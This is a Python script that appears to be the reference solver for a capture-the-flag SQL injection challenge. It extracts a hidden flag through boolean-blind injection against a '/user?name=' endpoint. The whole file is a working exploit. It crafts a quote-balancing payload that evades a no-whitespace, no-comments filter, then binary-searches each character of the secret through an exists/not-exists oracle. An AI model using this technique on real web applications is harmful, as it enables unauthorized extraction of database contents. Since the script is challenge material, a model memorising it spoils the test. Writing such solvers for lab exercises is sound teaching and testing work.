"""Reference solver for sqli: boolean-blind extraction of secret.flag.

    python3 solve.py <host> <port>

Uses the exists/not-exists oracle plus a subquery over the secret table. No
whitespace is allowed, so conditions are written with SQLite's tolerant syntax
(parentheses, no spaces). Binary-searches each character by its unicode code
point, then walks the length.
"""
import json
import sys
import urllib.parse
import urllib.request


def oracle(base, condition):
    # No comments and no whitespace are allowed, so we can't truncate the query;
    # instead the payload closes the string and consumes the trailing quote:
    #   WHERE name = ''OR(<cond>)AND'1'='1'
    # which reduces to just <cond> (the empty-name match is always false, and the
    # trailing '1'='1' pairs up the final quote). No always-true tail.
    payload = "'OR(%s)AND'1'='1" % condition
    q = base + "/user?name=" + urllib.parse.quote(payload, safe="")
    data = json.loads(urllib.request.urlopen(q, timeout=10).read())
    return bool(data.get("exists"))


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    # length of the flag
    n = 0
    while not oracle(base, f"(SELECT(length(flag))FROM(secret))={n}"):
        n += 1
        if n > 128:
            print("could not determine length", file=sys.stderr)
            sys.exit(1)
    out = []
    for i in range(1, n + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            # unicode(substr(flag,i,1)) > mid ?
            if oracle(base, f"unicode(substr((SELECT(flag)FROM(secret)),{i},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
    flag = "".join(out)
    print(flag)


if __name__ == "__main__":
    main()
